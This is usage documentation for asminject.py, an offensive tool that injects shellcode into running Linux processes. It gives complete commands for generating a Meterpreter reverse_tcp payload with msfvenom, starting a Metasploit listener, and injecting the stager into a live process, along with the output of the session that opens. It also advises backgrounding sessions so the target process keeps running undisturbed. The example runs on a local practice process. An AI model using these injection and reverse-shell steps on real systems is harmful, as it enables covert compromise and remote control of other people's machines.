# asminject.py examples - Shellcode/stager injection

* [Background](#background)
* [Important](#important)
* [Shellcode injection with multithreading](#shellcode-injection-with-multithreading)
* [Shellcode injection without multithreading](#shellcode-injection-without-multithreading)

## Background

Sometimes one's goal is easiest to achieve by injecting pre-existing shellcode (or a C2 stager) directly into process memory. This set of examples covers how to do that using `asminject.py`.

## Important

Regardless of the binary code you want to inject, in most cases you should avoid causing it to issue a process-level `exit`, as this will cause the target process to exit as well. In my testing, common C2 agents for Linux will perform a system-level exit instead of a thread-level exit. I assume this is because unlike Windows, where calling a thread-level `exit` is more or less the same across versions, locating and calling the `pthread_exit` function on an arbitrary Linux distribution and version is more complicated, and so most(?) C2 authors don't implement it.

In the case of [Sliver](https://github.com/BishopFox/sliver) and [Metasploit](https://github.com/rapid7/metasploit-framework), what this means is that instead of e.g. calling `kill` in a Sliver session or `exit` in a Meterpreter session, you should just send the session to the background unless you absolutely want the target process to exit.

## Shellcode injection with multithreading

The `execute_precompiled-threaded.s` payload is the preferred option for injecting shellcode or similar into an existing process using `asminject.py`. It launches the code in a separate thread, so the target process will continue executing normally after injection. This example uses that payload to launch a Meterpreter agent via an injected stager.

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python3 practice/python_loop.py

2022-05-12T20:11:30.614271 - Loop count 0
2022-05-12T20:11:35.616574 - Loop count 1
2022-05-12T20:11:40.620506 - Loop count 2
```

In a separate terminal, generate a Meterpreter payload, then launch a listener.

Note: in this example, the `linux/x64/meterpreter/reverse_tcp` payload is specified because the corresponding `asminject.py` example below is using the `x86-64` architecture. For `x86`, you'd want to use `linux/x86/meterpreter/reverse_tcp`, and for `arm32`, you'd want to use `linux/armle/meterpreter/reverse_tcp`.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw \
   -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit


[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it. Note the use of the `--precompiled` option to specify the `lmrt11443` shellcode.

```
# ps auxww | grep python3

root     2144475  [...] sudo python3 practice/python_loop.py
root     2144476  [...] python3 practice/python_loop.py

# python3 ./asminject.py 2144476 execute_precompiled-threaded.s \
   --relative-offsets-from-binaries \
   --precompiled lmrt11443

...omitted for brevity...
```

You should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

## Shellcode injection without  multithreading

The `execute_precompiled.s` payload is identical to the `execute_precompiled-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` (or any other library) is not required. Just swap out the payload name, e.g.:

```
# python3 ./asminject.py 2144476 execute_precompiled.s \
   --precompiled lmrt11443
```

Unless the shellcode is written specifically to return, this payload will never inform `asminject.py` that it is finished, so you'll need to Ctrl-C out of `asminject.py` after injection is successful.